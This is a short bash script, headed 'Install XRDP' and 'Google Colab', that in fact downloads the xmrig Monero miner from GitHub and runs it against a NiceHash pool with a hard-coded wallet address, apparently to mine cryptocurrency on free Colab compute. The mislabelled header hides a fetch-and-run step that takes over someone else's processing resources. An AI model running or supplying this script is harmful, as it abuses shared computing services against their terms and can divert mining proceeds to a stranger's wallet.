#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
sudo apt install screen
screen -R xmr
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o stratum+tcp://randomxmonero.eu-west.nicehash.com:3380 -u 35qheUaRktAzmvTyBdpzih4moF5E3yDb6K -p x -k --nicehash -a rx/0
